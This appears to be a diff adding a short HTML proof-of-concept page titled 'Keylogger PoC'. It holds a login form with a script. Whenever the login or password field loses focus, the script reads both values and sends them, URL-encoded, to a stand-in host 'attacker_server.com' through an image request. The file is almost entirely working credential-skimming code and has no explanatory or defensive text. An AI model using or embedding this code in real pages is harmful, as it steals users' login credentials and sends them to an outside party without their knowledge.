@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Keylogger PoC</title>
+	<script type="text/javascript">
+		function xxx(arg) {
+			var valores = {login: 'a',password: 'b'};
+			valores.login = document.getElementById("login").value;
+			valores.password = document.getElementById("password").value;
+			var attacker = 'http://attacker_server.com/?c=';
+			var data = encodeURIComponent(JSON.stringify(valores));
+			new Image().src = attacker + data;
+		}
+	</script>
+</head>
+<body>
+	<form action="#" method="POST">
+		Login: <input id="login" name="login" type="text" onblur="xxx(this)"/>
+		Password: <input id="password" name="login" type="password" onblur="xxx(this)"/>
+		<input type="submit" value="Submit" />
+	</form>
+</body>
+</html>
